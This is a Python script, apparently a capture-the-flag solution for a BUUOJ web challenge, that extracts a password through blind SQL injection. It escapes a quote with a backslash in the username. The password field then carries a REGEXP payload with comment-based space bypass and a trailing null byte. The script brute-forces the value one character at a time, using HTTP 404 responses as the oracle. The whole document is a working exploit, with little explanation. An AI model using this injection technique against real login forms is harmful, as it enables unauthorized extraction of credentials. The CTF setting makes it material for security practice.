import requests
import string

# flag:you_will_never_know7788990

burp0_url = "http://36acb1e8-5183-4a1c-b85b-7378809fb890.node4.buuoj.cn:81/index.php"
flag=''
allstr= string.ascii_letters+string.digits+"_@()-"          #string.ascii_letters:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ  string.digits:0123456789
for j in range(1000):       #遍历次数大于flag长度就行
    for i in allstr:
        tmp=flag+i
        burp0_headers = {"Origin": "http://58e00ca8-f54b-491e-ad79-dd348cc9e2f0.node4.buuoj.cn", "Upgrade-Insecure-Requests": "1", "DNT": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://58e00ca8-f54b-491e-ad79-dd348cc9e2f0.node4.buuoj.cn/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}
        # burp0_headers数据来自brupsuite里面拦截的头信息
        # burp0_data = {
        #     "username": "\\",
        #     "passwd": "||/**/username/**/REGEXP/**/binary/**/\"^{}\";\x00".format(tmp)
        # }
        burp0_data="username=%5c&passwd=%7c%7c%2f**%2fpasswd%2f**%2fREGEXP%2f**%2f%22%5e{}%22%3b%00".format(tmp)
        print(burp0_data)
        res = requests.post(burp0_url, headers=burp0_headers,data=burp0_data)
        if res.status_code==404:
            flag+=i
            print(flag)
            break
        if i==allstr[-1]:
            print("flag:"+flag)
            exit()


